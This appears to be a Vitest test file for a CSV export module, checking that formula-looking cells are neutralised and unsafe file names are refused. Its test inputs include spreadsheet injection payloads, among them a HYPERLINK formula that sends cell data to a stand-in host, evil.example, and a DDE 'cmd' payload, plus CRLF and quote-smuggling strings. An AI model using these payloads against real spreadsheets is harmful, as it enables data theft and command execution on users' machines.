// @vitest-environment node
import { describe, expect, it } from "vitest";

import { parseCsv } from "@/shared/test/csv";

import {
  CSV_UTF8_BOM,
  csvFileName,
  csvFileNameForRange,
  csvNumeral,
  formatCsv,
  formatCsvCell,
  neutralizeCsvFormula,
  quoteCsvField,
} from "./csv";

describe("quoteCsvField", () => {
  it.each([
    ["plain", "plain"],
    ["", ""],
    ["with space", "with space"],
    ["a,b", '"a,b"'],
    ['say "hi"', '"say ""hi"""'],
    ['"', '""""'],
    ["line\nbreak", '"line\nbreak"'],
    ["carriage\rreturn", '"carriage\rreturn"'],
    ["crlf\r\ninside", '"crlf\r\ninside"'],
    ["\u201Ccurly\u201D quotes", "\u201Ccurly\u201D quotes"], // not CSV quotes
  ])("%j → %j", (input, expected) => {
    expect(quoteCsvField(input)).toBe(expected);
  });
});

describe("neutralizeCsvFormula", () => {
  it.each([
    "=1+1",
    '=HYPERLINK("https://evil.example/?"&A1,"click")',
    "+1",
    "-1+2",
    "-2+3+cmd|' /C calc'!A0",
    "@SUM(A1:A2)",
    "\t=1",
    "\r=1",
    "\uFF1D1+1", // full-width equals sign
    "\uFF0B1",
    "\uFF0D1",
    "\uFF20SUM(A1)",
    // Leading whitespace an importer may trim away:
    " =1+1",
    "   @SUM(A1)",
    "\n=1+1",
    "\u00A0=1+1", // no-break space
    "\u3000=1+1", // ideographic space
    "\uFEFF=1+1", // byte-order mark
    " \t -1+2",
  ])("prefixes %j with a single quote", (input) => {
    expect(neutralizeCsvFormula(input)).toBe(`'${input}`);
  });

  it.each([
    "Ada Lovelace",
    "",
    "a=b",
    "ada@example.com", // `@` only matters in first position
    "'already quoted",
    "   ", // whitespace only
    " a=b",
    "\u201CAda\u201D",
    "1+1",
  ])("leaves %j unchanged", (input) => {
    expect(neutralizeCsvFormula(input)).toBe(input);
  });
});

describe("csvNumeral", () => {
  it.each(["0", "29", "29.00", "-5.00", "0.001", "123456789012345"])(
    "accepts the plain numeral %j",
    (text) => {
      expect(csvNumeral(text)).toEqual({ numeral: text });
    },
  );

  it.each([
    "",
    "+1",
    "1e5",
    "1,000",
    " 1",
    "1 ",
    ".5",
    "5.",
    "-",
    "NaN",
    "Infinity",
    "=1",
    "-1+2",
    "0x10",
  ])("refuses %j", (text) => {
    expect(() => csvNumeral(text)).toThrow(/plain decimal numeral/);
  });
});

describe("formatCsvCell", () => {
  it("writes null as an empty field", () => {
    expect(formatCsvCell(null)).toBe("");
  });

  it("writes numerals verbatim, negative ones included", () => {
    expect(formatCsvCell(csvNumeral("-12.50"))).toBe("-12.50");
  });

  it("neutralises before quoting, so the quote wraps the whole neutralised text", () => {
    expect(formatCsvCell('=A1,"x"')).toBe(`"'=A1,""x"""`);
    expect(parseCsv(formatCsvCell('=A1,"x"') + "\r\n")).toEqual([[`'=A1,"x"`]]);
  });

  it("re-checks a hand-built numeral so it cannot smuggle a formula", () => {
    expect(() => formatCsvCell({ numeral: "=1+1" })).toThrow(/plain decimal numeral/);
  });
});

describe("formatCsv", () => {
  it("writes the header and rows with CRLF record endings, the last one included", () => {
    const csv = formatCsv(
      ["A", "B"],
      [
        ["1", "2"],
        ["3", null],
      ],
    );

    expect(csv).toBe("A,B\r\n1,2\r\n3,\r\n");
  });

  it("writes only the header for an empty export, never an empty file", () => {
    expect(formatCsv(["Date", "Total"], [])).toBe("Date,Total\r\n");
  });

  it("does not add a BOM itself", () => {
    expect(formatCsv(["A"], [["x"]]).startsWith(CSV_UTF8_BOM)).toBe(false);
  });

  it("round-trips awkward text exactly through an RFC 4180 reader", () => {
    const awkward = [
      "comma, inside",
      'quote " inside',
      "multi\nline",
      "windows\r\nline",
      "trailing space ",
      " leading space",
      "\u201Ctypographic\u201D — and emoji 🧾",
      "",
    ];
    const csv = formatCsv(
      ["Text", "Amount"],
      awkward.map((text) => [text, csvNumeral("1.00")]),
    );

    expect(parseCsv(csv)).toEqual([
      ["Text", "Amount"],
      ...awkward.map((text) => [text, "1.00"]),
    ]);
  });

  it("keeps a null and an empty string as the same empty field", () => {
    expect(parseCsv(formatCsv(["A", "B"], [[null, ""]]))).toEqual([
      ["A", "B"],
      ["", ""],
    ]);
  });

  it("neutralises formula-looking header and body text alike", () => {
    expect(parseCsv(formatCsv(["=bad"], [["@evil"]]))).toEqual([["'=bad"], ["'@evil"]]);
  });

  it.each([
    ["short", [["only one"]]],
    ["long", [["one", "two", "three"]]],
  ])(
    "refuses a %s row rather than shifting values into other columns",
    (_label, rows) => {
      expect(() => formatCsv(["A", "B"], rows)).toThrow(/row 0 has/);
    },
  );

  it("refuses a header with no columns", () => {
    expect(() => formatCsv([], [])).toThrow(/at least one column/);
  });
});

describe("csvFileName", () => {
  it("dates the file by the UTC calendar day", () => {
    // 23:30 on 1 March in UTC−5 is already 2 March in UTC.
    expect(csvFileName("invoices", new Date("2026-03-01T23:30:00-05:00"))).toBe(
      "invoices-2026-03-02.csv",
    );
  });

  it.each(["", "Invoices", "account activity", "../etc", "a--b", "-a", 'a"b', "a/b"])(
    "refuses the base %j",
    (base) => {
      expect(() => csvFileName(base, new Date("2026-03-01T00:00:00Z"))).toThrow(
        /base must be/,
      );
    },
  );

  it("refuses an invalid date", () => {
    expect(() => csvFileName("invoices", new Date("nope"))).toThrow(/invalid date/);
  });
});

// The export tests rely on this reader to catch writer bugs, so it must not be lenient.
describe("parseCsv (test reader) is strict", () => {
  it.each([
    ["a bare LF", "a\nb\r\n"],
    ["a missing final CRLF", "a,b"],
    ["an unterminated quote", '"abc\r\n'],
    ["text after a closing quote", '"a"b\r\n'],
    ["a quote in an unquoted field", 'a"b\r\n'],
  ])("rejects %s", (_label, text) => {
    expect(() => parseCsv(text)).toThrow();
  });
});

describe("csvFileNameForRange", () => {
  const NOW = new Date("2026-04-05T12:00:00Z");

  it.each([
    [{ from: null, to: null }, "invoices-2026-04-05.csv"],
    [{ from: "2026-03-01", to: "2026-03-31" }, "invoices-2026-03-01-to-2026-03-31.csv"],
    [{ from: "2026-03-01", to: "2026-03-01" }, "invoices-2026-03-01-to-2026-03-01.csv"],
    [{ from: "2026-03-01", to: null }, "invoices-from-2026-03-01.csv"],
    [{ from: null, to: "2026-03-31" }, "invoices-to-2026-03-31.csv"],
  ])("%j → %s", (range, expected) => {
    expect(csvFileNameForRange("invoices", range, NOW)).toBe(expected);
  });

  it.each([
    { from: '2026-03-01"; x', to: null },
    { from: null, to: "2026-03-31\r\nX: y" },
  ])("refuses days that are not YYYY-MM-DD (%j)", (range) => {
    expect(() => csvFileNameForRange("invoices", range, NOW)).toThrow(/YYYY-MM-DD/);
  });

  it("still validates the base", () => {
    expect(() =>
      csvFileNameForRange("Bad Base", { from: "2026-03-01", to: null }, NOW),
    ).toThrow(/base must be/);
  });
});
